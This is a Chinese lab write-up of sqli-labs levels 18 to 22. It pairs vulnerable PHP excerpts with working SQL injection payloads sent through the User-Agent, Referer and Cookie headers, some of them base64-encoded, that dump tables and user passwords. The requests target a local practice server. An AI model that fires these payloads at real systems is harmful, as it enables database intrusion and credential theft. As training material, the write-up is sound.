# sqli-labs靶场(3)POST头部


sqli-labs靶场精简记录18-22

<!--more-->

### Less-18 POST - Header Injection - Uagent field - Error based

基于错误的用户代理，头部POST注入

```
	$uname = check_input($_POST['uname']);
	$passwd = check_input($_POST['passwd']);
...
			$insert="INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent', '$IP', $uname)";
			mysql_query($insert);
			//echo 'Your IP ADDRESS is: ' .$IP;
```

注入点在insert 语句，未对 uagent 和 ip_address 进行过滤，并且输出报错信息

> **PHP 里用来获取客户端 IP 的变量**
>
> - `$_SERVER['HTTP_CLIENT_IP']` 很少使用，客户端可以伪造。
> - `$_SERVER['HTTP_X_FORWARDED_FOR']`，客户端可以伪造。
> - `$_SERVER['REMOTE_ADDR']`，客户端不能伪造。

这里的IP无法伪造，故通过user-agent来进行注入

payload:爆数据库

```http
POST /Less-18/ HTTP/1.1
Host: 127.0.0.1:8888
User-Agent: ' and extractvalue(1,concat(0x7e,(select database()),0x7e)) and '
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://127.0.0.1:8888/Less-18/
Content-Type: application/x-www-form-urlencoded
Content-Length: 38
Connection: close
Upgrade-Insecure-Requests: 1

uname=admin&passwd=admin&submit=Submit
```

这里不使用注释符

```
$insert="INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent', '$IP', $uname)";
```

uagent 是在 IP 和 uname 之前的，如果注释掉后面的语句，会导致 Insert 语句异常

extractvalue()函数

```
爆表:
' and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())))  and '
爆列名：
' and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users' and table_schema='security')))  and ' 
爆列名：
' and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users' and table_schema='security')))  and ' 

' and extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users where username not in ('Dumb','Angelinal')))) and ' 
```

updatexml()函数

```
数据库:
' or updatexml(1,concat('#',(database())),0),' ',' ')-- #
' and updatexml(1,concat('#',(database())),0),' ',' ')-- #
爆表：
' or updatexml(1,concat('#',(select group_concat(table_name) from information_schema.tables where table_schema='security')),0),'','')#
爆字段
' and updatexml(1,concat('#',(select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users')),0),'','')-- #
爆数据：
' and updatexml(1,concat('#',(select * from (select concat_ws('#',id,username,password) from users limit 0,1) a)),0),'','')-- #
使用limit偏移注入依次爆出其他用户和密码。 
```

### Less-19 POST - Header Injection - Referer field - Error based

基于头部的Referer POST报错注入

```
	$uagent = $_SERVER['HTTP_REFERER'];
	$IP = $_SERVER['REMOTE_ADDR'];
...
	$uname = check_input($_POST['uname']);
	$passwd = check_input($_POST['passwd']);
...
			$insert="INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES ('$uagent', '$IP')";
			mysql_query($insert);	
...	
			echo 'Your Referer is: ' .$uagent;
```

注入点在referer，payload同上题

### Less-20 POST - Cookie injections - Uagent field - Error based 

基于错误的cookie头部POST注入

```
      $cookee = $_COOKIE['uname'];
...
			echo "YOUR COOKIE : uname = $cookee and expires: " . date($format, $timestamp);
...
			$sql="SELECT * FROM users WHERE username='$cookee' LIMIT 0,1";
...
				print_r(mysql_error());
```

payload

```http
GET /Less-20/ HTTP/1.1
Host: 192.168.131.1:1111
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Cookie: uname=-admin' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```



### Less-21 Cookie Injection- Error Based- complex - string

基于 base64 编码单引号和括号的 Cookie 注入

vul

```
			$cookee = $_COOKIE['uname'];
...
			echo "YOUR COOKIE : uname = $cookee and expires: " . date($format, $timestamp);
...
			$cookee = base64_decode($cookee);
			echo "<br></font>";
			$sql="SELECT * FROM users WHERE username=('$cookee') LIMIT 0,1";
```

注入点在cookie，但经过base64编码了

payload

```http
GET /Less-21/ HTTP/1.1
Host: 127.0.0.1:8888
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Cookie: uname=c3Fsc2VjJykgdW5pb24gc2VsZWN0IDEsMiwoU0VMRUNUIEdST1VQX0NPTkNBVCh1c2VybmFtZSxwYXNzd29yZCBTRVBBUkFUT1IgMHgzYzYyNzIzZSkgRlJPTSB1c2Vycykj
Connection: close
Upgrade-Insecure-Requests: 1
```

### Less-22 Cookie Injection- Error Based- Double Quotes - string

基于错误的双引号字符型Cookie注入

bypass

改双引号闭合

payload

```
GET /Less-22/ HTTP/1.1
Host: 127.0.0.1:8888
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Cookie: uname=MSIgb3IgZXh0cmFjdHZhbHVlKDEsY29uY2F0KDB4N2UsKHNlbGVjdCBncm91cF9jb25jYXQodGFibGVfbmFtZSkgZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEudGFibGVzIHdoZXJlIHRhYmxlX3NjaGVtYT1kYXRhYmFzZSgpKSwweDdlKSktLSAj
Connection: close
Upgrade-Insecure-Requests: 1
```

